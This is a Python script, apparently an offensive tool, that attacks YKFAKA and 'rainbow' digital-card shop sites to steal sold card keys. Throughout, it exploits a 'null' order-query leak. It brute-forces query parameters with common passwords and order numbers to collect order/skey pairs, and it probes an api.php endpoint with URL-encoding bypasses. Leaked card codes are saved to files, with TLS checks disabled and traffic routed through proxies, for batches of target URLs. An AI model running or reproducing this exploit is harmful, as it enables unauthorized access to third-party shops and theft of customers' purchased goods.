#!/usr/bin/env python3
"""Break sites using SUCCESS_PLAYBOOK patterns (YKFAKA / rainbow query / rainbow api).

Usage:
  python3 break_by_playbook.py OUT_DIR URL [URL2...]
  python3 break_by_playbook.py OUT_DIR --file targets.txt

Env: PROXY_URL, DELAY=0.25, API_SCAN=120, QUERY_FULL=0|1
"""
from __future__ import annotations

import json
import os
import re
import sys
import time
from datetime import datetime
from pathlib import Path
from urllib.parse import urljoin, urlparse

import requests

requests.packages.urllib3.disable_warnings()

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
DELAY = float(os.environ.get("DELAY", "0.25"))
API_SCAN = int(os.environ.get("API_SCAN", "80"))
QUERY_FULL = os.environ.get("QUERY_FULL", "0") == "1"

TOKEN_RE = re.compile(
    r'name=["\']__token__["\'][^>]*value=["\']([^"\']+)["\']'
    r'|value=["\']([^"\']+)["\'][^>]*name=["\']__token__["\']'
)
KM_RE = re.compile(r"/Query_Km/([a-zA-Z0-9]{10,14})")
SHOW = re.compile(r"showOrder\((\d+),\s*['\"]([^'\"]+)['\"]\)")
FAKA = re.compile(r"mod=faka&id=(\d+)&skey=([a-f0-9]{32})")
CARD = re.compile(r"<textarea[^>]*>([^<]+)</textarea>", re.S)


def log(msg: str, out: Path) -> None:
    print(msg, flush=True)
    with (out / "run.log").open("a", encoding="utf-8") as f:
        f.write(msg + "\n")


def load_proxy() -> dict | None:
    u = os.environ.get("PROXY_URL", "")
    if not u and os.path.isfile("/data/config/proxy.env"):
        for line in open("/data/config/proxy.env"):
            if line.startswith("PROXY_URL="):
                u = line.strip().split("=", 1)[1].strip().strip('"').strip("'")
    if u:
        return {"http": u, "https": u}
    return None


def session_for(base: str, proxies: dict | None) -> requests.Session:
    s = requests.Session()
    s.verify = False
    if proxies:
        s.proxies = proxies
    s.headers.update({"User-Agent": UA, "Referer": base})
    return s


def normalize_url(url: str) -> tuple[str, str]:
    u = url.strip()
    if not u.startswith("http"):
        u = "https://" + u
    p = urlparse(u)
    root = f"{p.scheme}://{p.netloc}/"
    if "/shop" in p.path:
        shop = urljoin(root, "shop/")
    else:
        shop = root
    return root, shop


def build_queries(orders: int) -> list[str]:
    qs: set[str] = set()
    for i in range(10):
        qs.add(str(i))
    for i in range(100):
        qs.add(f"{i:02d}")
    if QUERY_FULL:
        for i in range(1000):
            qs.add(f"{i:03d}")
        for p in range(130, 200):
            qs.add(str(p))
    for oid in range(max(1, orders - 30), orders + 1):
        qs.add(str(oid))
    for p in (
        "COM", "sms", "http", "qq", "bot", "138", "13", "2026", "202608",
        "123456", "888888", "666666", "5201314",
    ):
        qs.add(p)
    pwd = os.environ.get("PWD_FILE", "/workspace/query_pwd_list.txt")
    if os.path.isfile(pwd):
        with open(pwd, encoding="utf-8") as f:
            for line in f:
                v = line.strip()
                if v:
                    qs.add(v)
    return sorted(qs, key=lambda x: (len(x), x))


def try_ykfaka(root: str, s: requests.Session, out: Path) -> dict:
    r: dict = {"pattern": "ykfaka_null_km", "VULN": False}
    try:
        home = s.get(root, timeout=25)
        if "YKFAKA" not in home.text and "优卡" not in home.text:
            r["skip"] = "not_ykfaka"
            return r
        q = s.get(root + "Query.html", timeout=20)
        tok = TOKEN_RE.search(q.text)
        if not tok:
            r["error"] = "no_token"
            return r
        token = tok.group(1) or tok.group(2)
        p = s.post(
            root + "Query.html",
            data={"value": "null", "page": "1", "__token__": token},
            headers={"Referer": root + "Query.html"},
            timeout=45,
        )
        if "非法" in p.text:
            r["blocked"] = True
            return r
        ddids = list(dict.fromkeys(KM_RE.findall(p.text)))
        r["ddids"] = len(ddids)
        cards: list[str] = []
        for ddid in ddids[:200]:
            km = s.get(
                root + "Query_Km/" + ddid,
                headers={"Referer": root + "Query.html"},
                timeout=20,
            )
            if km.status_code == 200 and len(km.text) > 300:
                cards.append(f"{ddid}\t{km.text[:500]}")
            time.sleep(DELAY)
        r["cards_fetched"] = len(cards)
        if ddids:
            r["VULN"] = True
            (out / "ykfaka_ddids.txt").write_text("\n".join(ddids), encoding="utf-8")
            if cards:
                (out / "ykfaka_cards_sample.txt").write_text(
                    "\n".join(cards), encoding="utf-8"
                )
            log(f"YKFAKA HIT ddids={len(ddids)}", out)
    except Exception as e:
        r["error"] = str(e)[:120]
    return r


def try_rainbow_query(bases: list[str], s: requests.Session, out: Path, orders: int) -> dict:
    r: dict = {"pattern": "rainbow_query_faka", "VULN": False, "pairs": {}}
    queries = build_queries(orders)
    for base in bases:
        for q in queries:
            try:
                resp = s.get(base, params={"mod": "query", "data": q}, timeout=22)
                for m in SHOW.finditer(resp.text):
                    r["pairs"][m.group(1)] = m.group(2)
                for m in FAKA.finditer(resp.text):
                    r["pairs"][m.group(1)] = m.group(2)
                if r["pairs"]:
                    log(f"QUERY HIT base={base} q={q!r} pairs={len(r['pairs'])}", out)
            except Exception:
                pass
            time.sleep(DELAY)
    pairs = r["pairs"]
    cards: dict[str, str] = {}
    for oid, skey in list(pairs.items())[:50]:
        for base in bases:
            try:
                fk = s.get(
                    base,
                    params={"mod": "faka", "id": oid, "skey": skey},
                    timeout=20,
                )
                m = CARD.search(fk.text)
                if m:
                    cards[oid] = m.group(1).strip()
                    break
            except Exception:
                pass
            time.sleep(DELAY)
    r["pair_count"] = len(pairs)
    r["card_count"] = len(cards)
    r["VULN"] = bool(pairs)
    if pairs:
        (out / "pairs.json").write_text(
            json.dumps(pairs, ensure_ascii=False, indent=2), encoding="utf-8"
        )
    if cards:
        (out / "cards.txt").write_text(
            "\n".join(f"{o}\t{c}" for o, c in sorted(cards.items(), key=lambda x: int(x[0]))),
            encoding="utf-8",
        )
    return r


def try_rainbow_api(bases: list[str], s: requests.Session, out: Path, orders: int) -> dict:
    r: dict = {"pattern": "rainbow_api_search", "VULN": False, "hits": []}
    api_suffixes = [
        "api.php?act=search&id=",
        "%61pi.php/?act=search&id=",
        "%2561pi.php?act=search&id=",
    ]
    start = orders
    end = max(orders - API_SCAN, 0)
    for oid in range(start, end, -1):
        for base in bases:
            for suf in api_suffixes:
                url = base + suf + str(oid)
                try:
                    ar = s.get(url, timeout=18)
                    body = ar.text
                    if not body or len(body) < 15:
                        continue
                    if "No Act" in body or '"code":-5' in body:
                        continue
                    if '"code":0' in body and any(
                        x in body for x in ("km", "卡", "----", "kminfo")
                    ):
                        r["hits"].append({"id": oid, "url": url, "body": body[:600]})
                        r["VULN"] = True
                        log(f"API HIT id={oid} {suf[:20]}", out)
                except Exception:
                    pass
                time.sleep(DELAY * 2)
        if len(r["hits"]) >= 10:
            break
    if r["hits"]:
        (out / "api_hits.json").write_text(
            json.dumps(r["hits"], ensure_ascii=False, indent=2), encoding="utf-8"
        )
    return r


def break_one(url: str, out_root: Path, proxies: dict | None) -> dict:
    root, shop = normalize_url(url)
    host = urlparse(root).netloc.replace(".", "_")
    out = out_root / host
    out.mkdir(parents=True, exist_ok=True)

    report: dict = {
        "url": url,
        "root": root,
        "shop": shop,
        "ts": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "patterns": [],
    }

    bases = []
    if shop != root:
        bases.append(shop)
    bases.append(root)

    s = session_for(shop, proxies)
    orders = 0
    getcount_base = shop if "shop" in shop else root
    try:
        s.get(getcount_base, timeout=25)
        gc = s.get(urljoin(getcount_base, "ajax.php?act=getcount"), timeout=18)
        report["getcount"] = gc.text[:200]
        orders = int(json.loads(gc.text).get("orders", 0))
        report["orders"] = orders
        log(f"=== {url} orders={orders} ===", out)
    except Exception as e:
        report["warm_error"] = str(e)[:100]
        log(f"=== {url} warm fail: {e} ===", out)

    yk = try_ykfaka(root, session_for(root, proxies), out)
    report["patterns"].append(yk)

    if not yk.get("VULN"):
        rq = try_rainbow_query(bases, s, out, orders or 500)
        report["patterns"].append(rq)
    else:
        rq = {"skipped": True}

    api = try_rainbow_api(bases, s, out, orders or 500)
    report["patterns"].append(api)

    report["CARD_LEAK"] = any(p.get("VULN") for p in report["patterns"])
    report["best_pattern"] = next(
        (p["pattern"] for p in report["patterns"] if p.get("VULN")),
        None,
    )
    (out / "report.json").write_text(
        json.dumps(report, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    log(f"DONE {url} LEAK={report['CARD_LEAK']} best={report['best_pattern']}", out)
    return report


def main() -> None:
    args = sys.argv[1:]
    if not args:
        print("usage: break_by_playbook.py OUT_DIR URL...", file=sys.stderr)
        sys.exit(1)
    out_root = Path(args[0])
    out_root.mkdir(parents=True, exist_ok=True)
    urls: list[str] = []
    if len(args) > 2 and args[1] == "--file":
        urls = [x.strip() for x in open(args[2], encoding="utf-8") if x.strip()]
    else:
        urls = args[1:]

    proxies = load_proxy()
    summary = []
    for url in urls:
        try:
            summary.append(break_one(url, out_root, proxies))
        except Exception as e:
            summary.append({"url": url, "error": str(e)[:120]})
        time.sleep(1)

    (out_root / "summary.json").write_text(
        json.dumps(summary, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    hits = [x for x in summary if x.get("CARD_LEAK")]
    print(f"SUMMARY targets={len(urls)} hits={len(hits)}", flush=True)
    for h in hits:
        print(f"  HIT {h['url']} → {h.get('best_pattern')}", flush=True)


if __name__ == "__main__":
    main()
